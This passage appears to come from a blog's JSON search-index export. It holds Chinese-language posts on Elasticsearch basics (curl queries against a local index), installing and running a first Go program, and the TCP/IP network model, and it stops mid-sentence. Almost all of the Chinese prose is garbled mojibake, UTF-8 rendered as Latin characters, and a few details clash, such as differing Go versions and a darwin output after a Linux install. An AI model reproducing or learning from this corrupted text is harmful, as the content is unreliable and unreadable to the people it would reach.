å¯ä»¥çœ‹åˆ°ï¼Œè®°å½•çš„ Id æ²¡å˜ï¼Œä½†æ˜¯ç‰ˆæœ¬ï¼ˆversionï¼‰ä»1å˜æˆ2ï¼Œæ“ä½œç±»å‹ï¼ˆresultï¼‰ä»createdå˜æˆupdatedï¼Œcreatedå­—æ®µå˜æˆfalseï¼Œå› ä¸ºè¿™æ¬¡ä¸æ˜¯æ–°å»ºè®°å½•ã€‚ åˆ é™¤è®°å½•åˆ é™¤è®°å½•å°±æ˜¯å‘å‡º DELETE è¯·æ±‚ã€‚ 1curl -X DELETE 'localhost:9200/customer/_doc/1' æ•°æ®æŸ¥è¯¢è¿”å›æ‰€æœ‰è®°å½•æœ€æ–°ç‰ˆæœ¬çš„ ESï¼Œé€šè¿‡è¯·æ±‚/Index/_searchï¼Œå°±ä¼šè¿”å›å¯¹åº”ç´¢å¼•ä¸‹çš„æ‰€æœ‰è®°å½•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738curl -X GET \"localhost:9200/customer/_search?pretty\"&#123; \"took\" : 2, \"timed_out\" : false, \"_shards\" : &#123; \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 &#125;, \"hits\" : &#123; \"total\" : &#123; \"value\" : 2, \"relation\" : \"eq\" &#125;, \"max_score\" : 1.0, \"hits\" : [ &#123; \"_index\" : \"customer\", \"_id\" : \"-c3r_oMBDokqbW4aIGss\", \"_score\" : 1.0, \"_source\" : &#123; \"name\" : \"å¼ ä¸‰\", \"gender\" : \"ç”·\" &#125; &#125;, &#123; \"_index\" : \"customer\", \"_id\" : \"1\", \"_score\" : 1.0, \"_source\" : &#123; \"name\" : \"ç‹äº”\", \"gender\" : \"å¥³\" &#125; &#125; ] &#125;&#125; ä¸Šé¢ä»£ç ä¸­ï¼Œè¿”å›ç»“æœï¼š took å­—æ®µè¡¨ç¤ºè¯¥æ“ä½œçš„è€—æ—¶ï¼ˆå•ä½ä¸ºæ¯«ç§’ï¼‰ timed_out å­—æ®µè¡¨ç¤ºæ˜¯å¦è¶…æ—¶ hits å­—æ®µè¡¨ç¤ºå‘½ä¸­çš„è®°å½• hits çš„å­å­—æ®µçš„å«ä¹‰å¦‚ä¸‹ï¼š totalï¼šè¿”å›è®°å½•æ•° max_scoreï¼šæœ€é«˜çš„åŒ¹é…ç¨‹åº¦ hitsï¼šè¿”å›çš„è®°å½•ç»„æˆçš„æ•°ç»„ è¿”å›çš„è®°å½•ä¸­ï¼Œæ¯æ¡è®°å½•éƒ½æœ‰ä¸€ä¸ª _score å­—æ®µï¼Œè¡¨ç¤ºåŒ¹é…çš„ç¨‹åºï¼Œé»˜è®¤æ˜¯æŒ‰ç…§è¿™ä¸ªå­—æ®µé™åºæ’åˆ—ã€‚ å…¨æ–‡æœç´¢ES çš„æŸ¥è¯¢éå¸¸ç‰¹åˆ«ï¼Œä½¿ç”¨è‡ªå·±çš„æŸ¥è¯¢è¯­æ³•ï¼Œè¦æ±‚ GET è¯·æ±‚å¸¦æœ‰æ•°æ®ä½“ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455curl -X GET \"localhost:9200/_search?pretty\" -H 'Content-Type: application/json' -d'&#123; \"query\":&#123; \"bool\":&#123; \"must\":[ &#123; \"term\":&#123; \"name.keyword\":\"å¼ ä¸‰\" &#125; &#125; ], \"must_not\":[ ], \"should\":[ ] &#125; &#125;, \"from\":0, \"size\":10, \"sort\":[ ], \"aggs\":&#123; &#125;&#125;'&#123; \"took\" : 3, \"timed_out\" : false, \"_shards\" : &#123; \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 &#125;, \"hits\" : &#123; \"total\" : &#123; \"value\" : 1, \"relation\" : \"eq\" &#125;, \"max_score\" : 0.6931471, \"hits\" : [ &#123; \"_index\" : \"customer\", \"_id\" : \"-c3r_oMBDokqbW4aIGss\", \"_score\" : 0.6931471, \"_source\" : &#123; \"name\" : \"å¼ ä¸‰\", \"gender\" : \"ç”·\" &#125; &#125; ] &#125;&#125; å‚è€ƒé“¾æ¥ ElasticSearch Getting started guides ElasticSearch æŸ¥è¯¢è¯­æ³• å…¨æ–‡æœç´¢å¼•æ“ Elasticsearch å…¥é—¨æ•™ç¨‹ ES çš„ unassigned shards æ ¸å¿ƒå¤„ç†æ–¹æ¡ˆ","categories":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://www.0x2beace.com/categories/ElasticSearch/"}],"tags":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://www.0x2beace.com/tags/ElasticSearch/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”è¿è¡Œç¬¬ä¸€ä¸ª Go ç¨‹åº","slug":"go-language-learning-manualâ€”â€”transportation-first-go-procedure","date":"2022-10-21T14:41:54.000Z","updated":"2023-02-18T03:28:33.583Z","comments":true,"path":"go-language-learning-manualâ€”â€”transportation-first-go-procedure/","link":"","permalink":"https://www.0x2beace.com/go-language-learning-manual%E2%80%94%E2%80%94transportation-first-go-procedure/","excerpt":"æ—¶éš”ä¸€å¹´ä¹‹ä¹…ï¼Œå†ä¸€æ¬¡æ¥å­¦ä¹  Goã€‚","text":"æ—¶éš”ä¸€å¹´ä¹‹ä¹…ï¼Œå†ä¸€æ¬¡æ¥å­¦ä¹  Goã€‚ è®¾è®¡å“²å­¦Go è¯­è¨€çš„è®¾è®¡å“²å­¦ï¼šç®€å•ã€æ˜¾å¼ã€ç»„åˆã€å¹¶å‘å’Œé¢å‘å·¥ç¨‹ï¼š ç®€å•æ˜¯æŒ‡ Go è¯­è¨€ç‰¹æ€§å§‹ç»ˆä¿æŒåœ¨å°‘ä¸”è¶³å¤Ÿçš„æ°´å¹³ï¼Œä¸èµ°è¯­è¨€ç‰¹æ€§èåˆçš„é“è·¯ï¼Œä½†åˆä¸ä¹ç”Ÿäº§åŠ›ã€‚ç®€å•æ˜¯ Go ç”Ÿäº§åŠ›çš„æºæ³‰ï¼Œä¹Ÿæ˜¯ Go å¯¹å¼€å‘è€…çš„æœ€å¤§å¸å¼•åŠ› æ˜¾å¼æ˜¯æŒ‡ä»»ä½•ä»£ç è¡Œä¸ºéƒ½éœ€å¼€å‘è€…æ˜ç¡®çŸ¥æ™“ï¼Œä¸å­˜åœ¨å› â€œæš—ç®±æ“ä½œâ€è€Œå¯¼è‡´å¯ç»´æŠ¤æ€§é™ä½å’Œä¸å®‰å…¨çš„ç»“æœ ç»„åˆæ˜¯æ„å»º Go ç¨‹åºéª¨æ¶çš„ä¸»è¦æ–¹å¼ï¼Œå®ƒå¯ä»¥å¤§å¹…é™ä½ç¨‹åºå…ƒç´ é—´çš„è€¦åˆï¼Œæä¾›ç¨‹åºçš„å¯æ‰©å±•æ€§å’Œçµæ´»æ€§ å¹¶å‘æ˜¯ Go æ•é”åœ°æŠŠæ¡äº† CPU å‘å¤šæ ¸æ–¹å‘å‘å±•è¿™ä¸€è¶‹åŠ¿çš„ç»“æœï¼Œå¯ä»¥è®©å¼€å‘äººå‘˜åœ¨å¤šæ ¸æ—¶ä»£æ›´å®¹æ˜“å†™å‡ºå……åˆ†åˆ©ç”¨ç³»ç»Ÿèµ„æºã€æ”¯æŒæ€§èƒ½éš CPU æ ¸æ•°å¢åŠ è€Œè‡ªç„¶æå‡çš„åº”ç”¨ç¨‹åº é¢å‘å·¥ç¨‹æ˜¯ Go è¯­è¨€åœ¨è¯­è¨€è®¾è®¡ä¸Šçš„ä¸€ä¸ªé‡å¤§åˆ›æ–°ï¼Œå®ƒå°†è¯­è¨€è¦è§£å†³çš„é—®é¢˜åŸŸæ‰©å±•åˆ°é‚£äº›åŸæœ¬å¹¶ä¸æ˜¯ç”±ç¼–ç¨‹è¯­è¨€å»è§£å†³çš„é¢†åŸŸï¼Œä»è€Œè¦†ç›–äº†æ›´å¤šå¼€å‘è€…åœ¨å¼€å‘è¿‡ç¨‹é‡åˆ°çš„â€œç—›ç‚¹â€ï¼Œä¸ºå¼€å‘è€…æä¾›äº†æ›´å¥½çš„ä½¿ç”¨ä½“éªŒ å®‰è£…Go ä» 2009 å¹´å¼€æºå¹¶æ¼”åŒ–åˆ°ä»Šå¤©ï¼Œå®ƒçš„å®‰è£…æ–¹æ³•å…¶å®éƒ½å·²ç»å¾ˆæˆç†Ÿäº†ã€‚ å†™ä¸‹è¿™ç¯‡ç¬”è®°æ—¶ï¼ŒGo çš„ç‰ˆæœ¬å·²ç»åˆ°äº† 1.18.1ã€‚ Windows å’Œ Mac å¯ä»¥ç›´æ¥ä»å®˜ç½‘ä¸‹è½½ æœ€æ–°çš„å®‰è£…åŒ…ï¼Œåœ¨å›¾å½¢ç•Œé¢çš„å¼•å¯¼ä¸‹ï¼Œä¸€è·¯â€œä¸‹ä¸€æ­¥â€ï¼Œå³å¯å®‰è£…æˆåŠŸã€‚ Linux åˆ™é€šè¿‡å‘½ä»¤è¡Œçš„æ–¹å¼è¿›è¡Œå®‰è£…ï¼š 12$ wget -c https://go.dev/dl/go1.19.2.linux-amd64.tar.gz \\tar -C /usr/local -xzf go1.19.2.linux-amd64.tar.gz è§£å‹æˆåŠŸï¼Œå³å¯åœ¨ /usr/local ä¸‹é¢çœ‹åˆ°åä¸º go çš„å®‰è£…ç›®å½•ã€‚ æ·»åŠ ç¯å¢ƒå˜é‡ï¼š 1$ export PATH=$PATH:/usr/local/go/bin &amp;&amp; source ~/.profile æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š 123$ go versiongo version go1.19.2 darwin/amd64 é…ç½® Goå…¶å® Go åœ¨å®‰è£…åæ˜¯å¼€ç®±å³ç”¨çš„ï¼Œæ— éœ€åšä»»ä½•é…ç½®å°±èƒ½ä½¿ç”¨ã€‚ ä½†æ˜¯å› ä¸ºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œä¸€èˆ¬ä¼šä¿®æ”¹ GOPROXY ç¯å¢ƒå˜é‡ï¼š 123$ go env -w GOPROXY=https://goproxy.cn,direct# å¤‡ç”¨goproxyæœåŠ¡ https://mirrors.aliyun.com/goproxy/ é¡ºä¾¿çœ‹ä¸€ä¸‹å…¶ä»–çš„ä¸€äº›å¸¸ç”¨é…ç½®é¡¹ï¼š åç§° ä½œç”¨ å€¼ GOARCH ç”¨äºæŒ‡ç¤ºç¼–è¯‘å™¨ç”Ÿæˆä»£ç ï¼ˆé’ˆå¯¹å¹³å° CPU æ¶æ„ï¼‰ ä¸»è¦å€¼æ˜¯ AMD64ã€Arm ç­‰ï¼Œé»˜è®¤å€¼æ˜¯æœ¬æœºçš„ CPU æ¶æ„ GOOS ç”¨äºæŒ‡ç¤º Go ç¼–è¯‘å™¨ç”Ÿæˆä»£ç ï¼ˆé’ˆå¯¹å¹³å°çš„æ“ä½œç³»ç»Ÿ ä¸»è¦å€¼æ˜¯ Linuxã€Darwinã€Windows ç­‰ï¼Œé»˜è®¤å€¼æ˜¯æœ¬æœºçš„æ“ä½œç³»ç»Ÿ GO111MODULE å®ƒçš„å€¼å†³å®šäº†å½“å‰ä½¿ç”¨çš„æ„å»ºæ¨¡å¼æ˜¯ä¼ ç»Ÿçš„ GOPATH æ¨¡å¼è¿˜æ˜¯æ–°å¼•å…¥çš„ Go Module æ¨¡å¼ åœ¨ Go1.16 ç‰ˆæœ¬ Go Module æ„å»ºæ¨¡å¼é»˜è®¤å¼€å¯ï¼Œè¯¥å˜é‡çš„å€¼æ˜¯ on GOCACHE ç”¨äºæŒ‡ç¤ºå­˜å‚¨æ„å»ºç»“æœç¼“å­˜çš„è·¯å¾„ï¼Œè¿™äº›ç¼“å­˜å¯èƒ½ä¼šè¢«åç»­æ„å»ºæ‰€ä½¿ç”¨ åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼ŒGOCACHE æœ‰ä¸åŒçš„é»˜è®¤å€¼ï¼Œé€šè¿‡ go env GOMODCACHE æŸ¥çœ‹ GOMODCACHE ç”¨äºæŒ‡ç¤ºå­˜æ”¾ Go Module çš„è·¯å¾„ åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼ŒGOCACHE æœ‰ä¸åŒçš„é»˜è®¤å€¼ï¼Œé€šè¿‡ go env GOMODCACHE æŸ¥çœ‹ GOPROXY ç”¨æ¥é…ç½® Go Module proxy æœåŠ¡ é»˜è®¤å€¼æ˜¯ https://proxy.golang.org.direct GOPATH åœ¨ä¼ ç»Ÿçš„ GOPATH æ„å»ºæ¨¡å¼ä¸‹ï¼Œç”¨äºæŒ‡ç¤º Go åŒ…æœç´¢è·¯å¾„çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨ Go module æœºåˆ¶å¯ç”¨ä¹‹å‰æ˜¯ Go æ ¸å¿ƒé…ç½®é¡¹ï¼ŒGo 1.8 ç‰ˆæœ¬ä¹‹å‰éœ€è¦æ‰‹åŠ¨é…ç½®ï¼ŒGo 1.8 ç‰ˆæœ¬ä¹‹åå¼•å…¥äº†é»˜è®¤çš„GOPATHï¼ˆ$HOME/goï¼‰ GOROOT æŒ‡ç¤º GO å®‰è£…è·¯å¾„ï¼ŒGO 1.10 ç‰ˆæœ¬å¼•å…¥äº†é»˜è®¤çš„ GOROOTï¼Œå¼€å‘è€…æ— éœ€æ˜¾å¼è®¾ç½®ï¼ŒGo ç¨‹åºä¼šè‡ªåŠ¨æ ¹æ®è‡ªå·±æ‰€åœ¨çš„è·¯å¾„æ¨å¯¼å‡º GOROOT çš„è·¯å¾„ hello worldé¦–å…ˆï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ª main.go çš„æºæ–‡ä»¶ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ Go çš„å‘½åè§„åˆ™ï¼šGo æºæ–‡ä»¶æ€»æ˜¯ç”¨å…¨å°å†™å­—æ¯å½¢å¼çš„çŸ­å°å•è¯å‘½åï¼Œå¹¶ä¸” .go æ‰©å±•åç»“å°¾ã€‚ å¦‚æœè¦åœ¨æºæ–‡ä»¶çš„åå­—ä¸­ä½¿ç”¨å¤šä¸ªå•è¯ï¼Œé€šå¸¸ç›´æ¥æ˜¯å°†å¤šä¸ªå•è¯è¿æ¥èµ·æ¥ä½œä¸ºæºæ–‡ä»¶åï¼Œè€Œä¸æ˜¯ä½¿ç”¨å…¶ä»–åˆ†å‰²ç¬¦ã€‚æ¯”å¦‚ä¸‹åˆ’çº¿ï¼Œé€šå¸¸ä¼šä½¿ç”¨ helloworld.go ä½œä¸ºæ–‡ä»¶åï¼Œè€Œä¸æ˜¯ hello_world.goã€‚ è¿™æ˜¯å› ä¸ºä¸‹åˆ’çº¿è¿™ç§åˆ†å‰²ç¬¦ï¼Œåœ¨ Go æºæ–‡ä»¶å‘½åä¸­æœ‰ç‰¹æ®Šä½œç”¨ã€‚ 123456789// main.gopackage mainimport \"fmt\"func main()&#123; fmt.Println(\"hello world\")&#125; å†™å®Œä¹‹åï¼Œå°±å¯ä»¥ç¼–è¯‘è¿è¡Œç¬¬ä¸€ä¸ª Go ç¨‹åºäº†ï¼š 1234$ go build main.go # ç¼–è¯‘$ ./main # è¿è¡Œhello, world ä¸Šé¢è¿™ä¸ªç®€å•çš„ Go ç¨‹åºï¼Œç”±ä¸‰ä¸ªå¾ˆé‡è¦çš„éƒ¨åˆ†ç»„æˆï¼š package mainï¼šå®šä¹‰äº† Go ä¸­çš„ä¸€ä¸ªåŒ… package import fmtï¼šå£°æ˜å¯¼å…¥æ ‡å‡†åº“ fmt ç›®å½•ä¸‹çš„åŒ… func main(){}ï¼šå®šä¹‰å…¥å£å‡½æ•° ä¸‹é¢ä¸€ä¸€è¯´æ˜ã€‚ packageåŒ…ï¼ˆpackageï¼‰æ˜¯ Go è¯­è¨€çš„åŸºæœ¬ç»„æˆå•å…ƒï¼Œé€šå¸¸ä½¿ç”¨å•ä¸ªçš„å°å†™å•è¯å‘½åï¼Œä¸€ä¸ª Go ç¨‹åºæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç»„åŒ…çš„é›†åˆã€‚ æ‰€æœ‰ Go ä»£ç éƒ½æœ‰å±äºè‡ªå·±çš„ packageï¼ˆå¾ˆåƒ PHP çš„å‘½åç©ºé—´çš„æ¦‚å¿µï¼‰ï¼Œåœ¨è¿™é‡Œçš„â€œhelloworldâ€ç¤ºä¾‹çš„æ‰€æœ‰ä»£ç éƒ½åœ¨ä¸€ä¸ªåä¸º main çš„åŒ…ä¸­ã€‚main åŒ…åœ¨ Go ä¸­æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŒ…ï¼Œæ•´ä¸ª Go ç¨‹åºä¸­ä»…å…è®¸å­˜åœ¨ä¸€ä¸ªåä¸º main çš„åŒ…ã€‚ importimport çš„ä½œç”¨æ˜¯å¯¼å…¥æ ‡å‡†åº“æˆ–è€…ç¬¬ä¸‰æ–¹åŒ…ï¼Œåœ¨è¿™é‡Œçš„ä½œç”¨æ˜¯å¯¼å…¥æ ‡å‡†åº“ fmt ç›®å½•ä¸‹çš„åŒ…ã€‚ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæœ‰ä¸¤å¤„éƒ½ä½¿ç”¨äº† fmt è¿™ä¸ªå­—é¢å€¼ï¼Œä½†æ˜¯å…¶å«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚ import fmt ä¸€è¡Œä¸­â€œfmtâ€ä»£è¡¨çš„æ˜¯åŒ…çš„å¯¼å…¥è·¯å¾„ï¼ˆImportï¼‰ï¼Œå®ƒè¡¨ç¤ºçš„æ˜¯æ ‡å‡†åº“ä¸‹çš„ fmt ç›®å½• fmt.Println å‡½æ•°è°ƒç”¨ä¸€è¡Œä¸­çš„â€œfmtâ€ä»£è¡¨çš„åˆ™æ˜¯åŒ…å main å‡½æ•°ä½“ä¸­ä¹‹æ‰€ä»¥å¯ä»¥è°ƒç”¨ fmt åŒ…çš„ Println å‡½æ•°ï¼Œè¿˜æœ‰æœ€åä¸€ä¸ªåŸå› ï¼Œé‚£å°±æ˜¯ Println å‡½æ•°åçš„é¦–å­—æ¯æ˜¯å¤§å†™çš„ã€‚ åœ¨ Go è¯­è¨€ä¸­ï¼Œåªæœ‰é¦–å­—æ¯ä¸ºå¤§å†™çš„æ ‡è¯†ç¬¦æ‰æ˜¯å¯¼å‡ºçš„ï¼ˆExportedï¼‰ï¼Œæ‰èƒ½å¯¹åŒ…å¤–çš„ä»£ç å¯è§ï¼›å¦‚æœé¦–å­—æ¯æ˜¯å°å†™çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜è¿™ä¸ªæ ‡è¯†ç¬¦ä»…é™äºåœ¨å£°æ˜å®ƒçš„åŒ…å†…å¯è§ã€‚ mainmain åŒ…ä¸­çš„ä¸»è¦ä»£ç æ˜¯ä¸€ä¸ªåä¸º main çš„å‡½æ•°ï¼š 123func main() &#123; fmt.Println(\"hello, world\")&#125; è¿™é‡Œçš„ main å‡½æ•°ä¼šæ¯”è¾ƒç‰¹æ®Šï¼šå½“è¿è¡Œä¸€ä¸ªå¯æ‰§è¡Œçš„ Go ç¨‹åºçš„æ—¶ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½ä¼šä»è¿™ä¸ªå…¥å£å‡½æ•°å¼€å§‹è¿è¡Œã€‚ Go è¦æ±‚æ‰€æœ‰çš„å‡½æ•°ä½“éƒ½è¦è¢«èŠ±æ‹¬å·åŒ…è£¹èµ·æ¥ï¼Œç”¨æ¥æ ‡è®°å‡½æ•°ä½“ã€‚æŒ‰ç…§æƒ¯ä¾‹ï¼Œæ¨èæŠŠå·¦èŠ±æ‹¬å·ä¸å‡½æ•°å£°æ˜ç½®äºåŒä¸€è¡Œå¹¶ä»¥ç©ºæ ¼åˆ†éš”ã€‚Go è¯­è¨€å†…ç½®äº†ä¸€å¥— Go ç¤¾åŒºçº¦å®šä¿—ç§°çš„ä»£ç é£æ ¼ï¼Œå¹¶éšå®‰è£…åŒ…æä¾›äº†ä¸€ä¸ªåä¸º Gofmt çš„å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥å¸®åŠ©å°†ä»£ç è‡ªåŠ¨æ ¼å¼åŒ–ä¸ºçº¦å®šçš„é£æ ¼ã€‚ é€šè¿‡è§‚å¯Ÿè¾“å‡ºï¼Œå¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„å­—ç¬¦ä¸²å°±æ˜¯æ‰§è¡Œç¨‹åºååœ¨ç»ˆç«¯çš„æ ‡å‡†è¾“å‡ºä¸Šçœ‹åˆ°çš„å­—ç¬¦ä¸²ã€‚ è¿™ç§â€œæ‰€è§å³æ‰€å¾—â€å¾—ç›Šäº Go æºç æ–‡ä»¶æœ¬èº«é‡‡ç”¨çš„æ˜¯ Unicode å­—ç¬¦é›†ï¼Œè€Œä¸”ç”¨çš„æ˜¯ UTF-8 æ ‡å‡†çš„å­—ç¬¦ç¼–ç æ–¹å¼ï¼Œè¿™ä¸ç¼–è¯‘åçš„ç¨‹åºæ‰€è¿è¡Œçš„ç¯å¢ƒæ‰€ä½¿ç”¨çš„å­—ç¬¦é›†å’Œå­—ç¬¦ç¼–ç æ–¹å¼æ˜¯ä¸€è‡´çš„ã€‚ æ•´ä¸ªç¤ºä¾‹ç¨‹åºæºç ä¸­ï¼Œéƒ½æ²¡æœ‰ä½¿ç”¨è¿‡åˆ†å·æ¥æ ‡è¯†è¯­å¥çš„ç»“æŸï¼Œè¿™æ˜¯å› ä¸ºï¼Œå¤§å¤šæ•°åˆ†å·éƒ½æ˜¯å¯é€‰çš„ï¼Œå¸¸å¸¸è¢«çœç•¥ï¼Œä¸è¿‡åœ¨æºç ç¼–è¯‘æ—¶ï¼ŒGo ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ’å…¥è¿™äº›è¢«çœç•¥çš„åˆ†å·ã€‚ æ‰€ä»¥åŠ ä¸Šåˆ†å·ä¹Ÿæ˜¯å®Œå…¨åˆæ³•çš„ï¼Œåªä¸è¿‡ gofmt åœ¨æŒ‰çº¦å®šæ ¼å¼åŒ–ä»£ç æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤è¿™äº›åˆ†å·ã€‚ æ€»ç»“é€šè¿‡ hello world ç¤ºä¾‹ç¨‹åºï¼Œäº†è§£äº† Go çš„åŸºæœ¬æºç ç»“æ„ï¼Œä»¥ä¸‹æ˜¯é‡ç‚¹ï¼š åŒ…æ˜¯ Go è¯­è¨€çš„åŸºæœ¬ç»„æˆå•å…ƒã€‚ä¸€ä¸ª Go ç¨‹åºå°±æ˜¯ä¸€ç»„åŒ…çš„é›†åˆï¼Œæ‰€æœ‰ Go ä»£ç éƒ½ä½äºåŒ…ä¸­ Go æºç å¯ä»¥å¯¼å…¥å…¶ä»– Go åŒ…ï¼Œå¹¶ä½¿ç”¨å…¶ä¸­çš„å¯¼å‡ºè¯­æ³•å…ƒç´ ï¼ŒåŒ…æ‹¬ç±»å‹ã€å˜é‡ã€å‡½æ•°ã€æ–¹æ³•ç­‰ æ•´ä¸ª Go ç¨‹åºä¸­ä»…å…è®¸å­˜åœ¨ä¸€ä¸ªåä¸º main çš„åŒ…åªèƒ½ç”±ä¸€ä¸ª main åŒ…; main å‡½æ•°æ˜¯æ•´ä¸ª Go åº”ç”¨çš„å…¥å£å‡½æ•° å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"è®¡ç®—æœºç½‘ç»œå­¦ä¹ â€”â€”01 TCP/IPç½‘ç»œæ¨¡å‹","slug":"computer-network-learning-01-tcp-ip-network-model","date":"2022-10-19T01:47:33.000Z","updated":"2023-02-18T03:28:33.574Z","comments":true,"path":"computer-network-learning-01-tcp-ip-network-model/","link":"","permalink":"https://www.0x2beace.com/computer-network-learning-01-tcp-ip-network-model/","excerpt":"ä¸ºäº†ä½¿ä¸åŒè®¡ç®—æœºå‚å®¶ç”Ÿäº§çš„è®¡ç®—æœºèƒ½å¤Ÿç›¸äº’é€šä¿¡ï¼Œä»¥ä¾¿åœ¨æ›´å¤§çš„èŒƒå›´å†…å»ºç«‹è®¡ç®—æœºç½‘ç»œï¼Œå›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼ˆISOï¼‰åœ¨1978å¹´æå‡ºäº†â€å¼€æ”¾ç³»ç»Ÿäº’è”å‚è€ƒæ¨¡å‹â€ï¼Œå³è‘—åçš„OSI/RMæ¨¡å‹ï¼ˆOpen System Interconnection/Reference Modelï¼‰ã€‚","text":"ä¸ºäº†ä½¿ä¸åŒè®¡ç®—æœºå‚å®¶ç”Ÿäº§çš„è®¡ç®—æœºèƒ½å¤Ÿç›¸äº’é€šä¿¡ï¼Œä»¥ä¾¿åœ¨æ›´å¤§çš„èŒƒå›´å†…å»ºç«‹è®¡ç®—æœºç½‘ç»œï¼Œå›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼ˆISOï¼‰åœ¨1978å¹´æå‡ºäº†â€å¼€æ”¾ç³»ç»Ÿäº’è”å‚è€ƒæ¨¡å‹â€ï¼Œå³è‘—åçš„OSI/RMæ¨¡å‹ï¼ˆOpen System Interconnection/Reference Modelï¼‰ã€‚ å®ƒå°†è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„çš„é€šä¿¡åè®®åˆ’åˆ†ä¸ºä¸ƒå±‚ï¼Œè‡ªä¸‹è€Œä¸Šä¾æ¬¡ä¸ºï¼š ç‰©ç†å±‚ï¼ˆPhysics Layerï¼‰ æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰ ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰ ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰ ä¼šè¯å±‚ï¼ˆSession Layerï¼‰ è¡¨ç¤ºå±‚ï¼ˆPresentation Layerï¼‰ åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰ é™¤äº†æ ‡å‡†çš„OSIä¸ƒå±‚æ¨¡å‹ä»¥å¤–ï¼Œå¸¸è§çš„ç½‘ç»œå±‚æ¬¡åˆ’åˆ†è¿˜æœ‰TCP/IPå››å±‚åè®®ä»¥åŠTCP/IPäº”å±‚åè®®ï¼Œå®ƒä»¬ä¹‹é—´çš„å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åº”ç”¨å±‚åº”ç”¨å±‚æ˜¯ç½‘ç»œæ¨¡å‹ä¸­çš„æœ€ä¸Šå±‚ã€‚ æˆ‘ä»¬èƒ½ç›´æ¥æ¥è§¦åˆ°çš„å°±æ˜¯åº”ç”¨å±‚ï¼Œç”µè„‘æˆ–æ‰‹æœºä½¿ç”¨çš„åº”ç”¨è½¯ä»¶éƒ½æ˜¯åœ¨åº”ç”¨å±‚å®ç°çš„ã€‚é‚£ä¹ˆï¼Œå½“ä¸¤ä¸ªä¸åŒè®¾å¤‡çš„åº”ç”¨éœ€è¦é€šä¿¡çš„æ—¶å€™ï¼Œåº”ç”¨å°±æŠŠåº”ç”¨æ•°æ®ä¼ ç»™ä¸‹ä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯ä¼ è¾“å±‚ã€‚ åº”ç”¨å±‚åªéœ€è¦å…³æ³¨ä¸ºç”¨æˆ·æä¾›åº”ç”¨åŠŸèƒ½ï¼Œä¸ç”¨å»å…³å¿ƒæ•°æ®æ˜¯å¦‚ä½•ä¼ è¾“çš„ã€‚ ä¼ è¾“å±‚åº”ç”¨å±‚çš„æ•°æ®åŒ…ä¼šä¼ ç»™ä¼ è¾“å±‚ï¼Œä¼ è¾“å±‚(Transport Layer)æ˜¯ä¸ºåº”ç”¨å±‚æä¾›ç½‘ç»œæ”¯æŒçš„ã€‚ åœ¨ä¼ è¾“å±‚ä¼šæœ‰ä¸¤ä¸ªä¼ è¾“åè®®ï¼Œåˆ†åˆ«æ˜¯ TCP å’Œ UDPã€‚ TCP çš„å…¨ç§°å«ä¼ è¾“å±‚æ§åˆ¶åè®®(Transmission Control Protocol)ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ä½¿ç”¨çš„æ­£æ˜¯ TCP ä¼ è¾“å±‚åè®®ï¼Œæ¯” å¦‚ HTTP åº”ç”¨å±‚åè®®ã€‚TCP ç›¸æ¯” UDP å¤šäº†å¾ˆå¤šç‰¹æ€§ï¼Œæ¯”å¦‚æµô°æ§åˆ¶ã€è¶…æ—¶ô°€ä¼ ã€æ‹¥å¡æ§åˆ¶ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¸ºäº†ä¿è¯ æ•°æ®åŒ…èƒ½å¯é åœ°ä¼ è¾“ç»™å¯¹æ–¹ã€‚ UDP å°±ç›¸å¯¹å¾ˆç®€å•ï¼Œç®€å•åˆ°åªè´Ÿè´£å‘é€æ•°æ®åŒ…ï¼Œä¸ä¿è¯æ•°æ®åŒ…æ˜¯å¦èƒ½æŠµè¾¾å¯¹æ–¹ï¼Œä½†å®ƒå®æ—¶æ€§ç›¸å¯¹æ›´å¥½ï¼Œä¼ è¾“æ•ˆç‡ ä¹Ÿé«˜ã€‚å½“ç„¶ï¼ŒUDP ä¹Ÿå¯ä»¥å®ç°å¯é ä¼ è¾“ï¼ŒæŠŠ TCP çš„ç‰¹æ€§åœ¨åº”ç”¨å±‚ä¸Šå®ç°å°±å¯ä»¥ï¼Œä¸è¿‡è¦å®ç°ä¸€ä¸ªå•†ç”¨çš„å¯é  UDP ä¼ 